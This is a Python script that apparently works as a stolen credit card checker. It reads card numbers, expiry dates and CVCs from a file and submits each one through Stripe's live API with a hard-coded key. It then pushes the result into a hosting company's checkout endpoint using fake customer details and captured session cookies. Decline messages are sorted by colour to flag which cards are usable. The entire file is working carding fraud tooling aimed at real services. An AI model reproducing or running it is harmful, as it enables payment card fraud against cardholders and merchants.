import time

import pyfiglet
import requests
import os
file=open('BAT.txt',"+r")
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'


try:
 pass
except:
 os.system('pip install python-cfonts')
def JOK(text, delay, add_new_line=True):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    if add_new_line:
        print("\n", end="", flush=True)

logo = pyfiglet.figlet_format('            MO3GZA ')
print(Z+logo)
logo = pyfiglet.figlet_format('         		&  ')
print(B+logo)
logo = pyfiglet.figlet_format('            JOKER ')
print(F+logo)
JOK(C+"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", 0.07, True)

print(X+'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
start_num = 0
for P in file.readlines():
  start_num += 1
  n = P.split('|')[0]
  mm=P.split('|')[1]
  yy=P.split('|')[2][-2:]
  cvc=P.split('|')[3].replace('\n', '')
  P=P.replace('\n', '')	
  headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}

  data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bc41e0dc-6835-4cf4-b7ea-b06c604ea584d0fb79&muid=4f3a1d57-29e4-472d-9d22-4709c087c90c54b710&sid=e1ae0297-2020-4723-a2f9-76ed589d2bd24bbf20&payment_user_agent=stripe.js%2Fd749fa7cbc%3B+stripe-js-v3%2Fd749fa7cbc&time_on_page=103972&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'

  response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
  try:
    id=(response['id'])
  except Exception:
    if "Your card has insufficient funds." in response['error']['message']:
      print(F+f'[ {start_num} ]',P,' ➜ ',response['error']['message'])
    elif "Your card's security code is invalid." in response['error']['message']:
      print(F+f'[ {start_num} ]',P,' ➜ ',response['error']['message'])
    elif "Your card does not support this type of purchase." in response['error']['message']:
      print(Z+f'[ {start_num} ]',P,' ➜ ',response['error']['message'])
    elif "Your card's expiration month is invalid." in response['error']['message']:
      print(Z+f'[ {start_num} ]',P,' ➜ ',response['error']['message'])
    else:
      print(Z+f'[ {start_num} ]',P,' ➜ ',response['error']['message'])
    continue
  cookies = {
    '__cf_bm': 'Eoxg5YgIli3.CXHEbGKNCUaDrPSd8S2QjVCngKU12ZU-1687731850-0-AQutBi3hNRM0TDbtZ4av3sWxNmcRdt8EiWT/eedRinT6WKxCXadzbZSJD95l7ZzGIw==',
    '_fbp': 'fb.1.1687735380088.1104063452',
    '__zlcmid': '1GXlvLUHEoMJWUg',
    'WHMCSy551iLvnhYt7': '0f1e69eff1270e47f9894de581c0f3d9',
    '__stripe_mid': '4f3a1d57-29e4-472d-9d22-4709c087c90c54b710',
    '__stripe_sid': 'e1ae0297-2020-4723-a2f9-76ed589d2bd24bbf20',
}

  headers = {
    'authority': 'my.hostarmada.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__cf_bm=Eoxg5YgIli3.CXHEbGKNCUaDrPSd8S2QjVCngKU12ZU-1687731850-0-AQutBi3hNRM0TDbtZ4av3sWxNmcRdt8EiWT/eedRinT6WKxCXadzbZSJD95l7ZzGIw==; _fbp=fb.1.1687735380088.1104063452; __zlcmid=1GXlvLUHEoMJWUg; WHMCSy551iLvnhYt7=0f1e69eff1270e47f9894de581c0f3d9; __stripe_mid=4f3a1d57-29e4-472d-9d22-4709c087c90c54b710; __stripe_sid=e1ae0297-2020-4723-a2f9-76ed589d2bd24bbf20',
    'origin': 'https://my.hostarmada.com',
    'referer': 'https://my.hostarmada.com/cart.php?a=checkout&e=false',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

  data = {
    'token': '0707729f031b79eb31334665fef5fbb7faf2d2bc',
    'submit': 'true',
    'custtype': 'new',
    'loginemail': '',
    'loginpassword': '',
    'firstname': 'joker',
    'lastname': 'mm',
    'email': 'joker97e@gmail.com',
    'country-calling-code-phonenumber': [
        '1',
        '',
    ],
    'phonenumber': '587-625-8885',
    'companyname': '',
    'address1': '200 banco',
    'address2': '',
    'city': 'NEW YORK',
    'state': 'New York',
    'postcode': '10080',
    'country': 'US',
    'contact': '',
    'domaincontactfirstname': '',
    'domaincontactlastname': '',
    'domaincontactemail': '',
    'country-calling-code-domaincontactphonenumber': '1',
    'domaincontactphonenumber': '',
    'domaincontactcompanyname': '',
    'domaincontactaddress1': '',
    'domaincontactaddress2': '',
    'domaincontactcity': '',
    'domaincontactstate': '',
    'domaincontactpostcode': '',
    'domaincontactcountry': 'US',
    'domaincontacttax_id': '',
    'password': 'JOKER12',
    'password2': 'JOKER12',
    'paymentmethod': 'stripe',
    'ccinfo': 'new',
    'ccdescription': '',
    'marketingoptin': '1',
    'accepttos': 'on',
    'payment_method_id': id,
}

  response = requests.post(
      'https://my.hostarmada.com/index.php?rp=/stripe/payment/intent',
      cookies=cookies,
      headers=headers,
      data=data,
  )


  if "Your card's security code is" in response.json()['warning']:
    print(F+f'[ {start_num} ]',P,' ➜ ',response.json()['warning'])
  elif "Your card has insufficient funds." in response.json()['warning']:
    print(F+f'[ {start_num} ]',P,' ➜ ',response.json()['warning'])
  elif "Your card does not support this type of purchase." in response.json()['warning']:
    print(Z+f'[ {start_num} ]',P,' ➜ ',response.json()['warning'])
  elif "Your card's expiration month is invalid." in response.json()['warning']:
    print(Z+f'[ {start_num} ]',P,' ➜ ',response.json()['warning'])
  else:
    print(Z+f'[ {start_num} ]',P,' ➜ ',response.json()['warning'])
